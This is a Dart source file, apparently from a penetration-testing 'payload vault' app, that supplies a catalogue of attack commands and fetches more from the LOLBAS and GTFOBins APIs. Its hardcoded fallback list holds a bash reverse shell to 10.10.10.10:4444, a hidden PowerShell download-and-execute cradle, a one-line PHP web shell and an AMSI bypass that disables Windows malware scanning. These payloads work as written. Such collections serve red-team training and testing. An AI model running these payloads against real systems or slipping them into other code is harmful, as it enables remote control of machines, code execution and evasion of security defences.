import 'package:dio/dio.dart';
import 'dart:developer' as developer;
import '../../domain/entities/payload.dart';

class PayloadLocalDataSource {
  final Dio _dio = Dio(BaseOptions(
    connectTimeout: const Duration(seconds: 8),
    receiveTimeout: const Duration(seconds: 8),
  ));

  // Static fallback payloads for offline mode or web testing
  final List<Payload> _staticPayloads = [
    Payload(
      title: 'Bash Reverse Shell',
      category: 'LINUX',
      description: 'Classic interactive bash reverse shell command.',
      code: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1',
      source: 'Custom',
    ),
    Payload(
      title: 'PowerShell IEX Download',
      category: 'WINDOWS',
      description: 'Download and execute a script in memory.',
      code: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.10.10/shell.ps1\')"',
      source: 'Custom',
    ),
    Payload(
      title: 'PHP Web Shell',
      category: 'WEB',
      description: 'One-liner PHP shell for command execution.',
      code: '<?php system(\$_GET["cmd"]); ?>',
      source: 'Custom',
    ),
    Payload(
      title: 'AMSI Bypass (PowerShell)',
      category: 'EVASION',
      description: 'Patching AMSI in memory to bypass security checks.',
      code: '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue(\$null,\$true)',
      source: 'Custom',
    ),
  ];

  Future<List<Payload>> getPayloads() async {
    final List<Payload> allPayloads = List.from(_staticPayloads);

    // 1. Fetch & Parse LOLBAS (Windows Binaries Bypass API)
    try {
      final response = await _dio.get('https://lolbas-project.github.io/api/lolbas.json');
      if (response.statusCode == 200 && response.data is List) {
        final List data = response.data;
        for (var item in data) {
          final String name = item['Name'] ?? 'Unknown';
          final String desc = item['Description'] ?? '';
          final List commands = item['Commands'] ?? [];
          for (var cmd in commands) {
            final String cmdText = cmd['Command'] ?? '';
            final String cmdDesc = cmd['Description'] ?? desc;
            final String category = (cmd['Category'] ?? 'Evasion').toString().toUpperCase();
            
            if (cmdText.isNotEmpty) {
              allPayloads.add(Payload(
                title: '$name - $category',
                category: 'WINDOWS',
                description: cmdDesc,
                code: cmdText,
                source: 'LOLBAS',
              ));
            }
          }
        }
      }
    } catch (e) {
      developer.log('Failed to fetch LOLBAS live API', name: 'PayloadVault', error: e);
    }

    // 2. Fetch & Parse GTFOBins (Linux Binaries Bypass API)
    try {
      final response = await _dio.get('https://gtfobins.github.io/api/binaries.json');
      if (response.statusCode == 200 && response.data is Map) {
        final Map data = response.data;
        data.forEach((binary, value) {
          if (value is Map) {
            value.forEach((functionName, cmdList) {
              if (cmdList is List) {
                for (var cmd in cmdList) {
                  final String codeText = cmd['code'] ?? '';
                  final String desc = cmd['description'] ?? 'Execute Unix commands via $binary.';
                  if (codeText.isNotEmpty) {
                    allPayloads.add(Payload(
                      title: '$binary - ${functionName.toString().toUpperCase()}',
                      category: 'LINUX',
                      description: desc,
                      code: codeText,
                      source: 'GTFOBins',
                    ));
                  }
                }
              }
            });
          }
        });
      }
    } catch (e) {
      developer.log('Failed to fetch GTFOBins live API', name: 'PayloadVault', error: e);
    }

    return allPayloads;
  }
}
